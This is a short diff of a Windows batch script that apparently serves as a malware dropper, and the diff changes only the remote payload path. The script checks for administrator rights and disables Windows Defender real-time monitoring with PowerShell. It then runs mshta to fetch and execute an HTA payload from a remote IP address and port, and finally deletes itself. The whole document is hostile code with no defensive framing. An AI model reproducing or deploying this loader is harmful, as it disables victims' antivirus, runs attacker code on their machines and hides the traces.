@@ -5,6 +5,6 @@ if %errorLevel% neq 0 (
     exit
 )
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-mshta http://192.168.242.131:9999/zza1x
+mshta http://192.168.242.131:9999/CadZd
 del "%~f0"
 exit
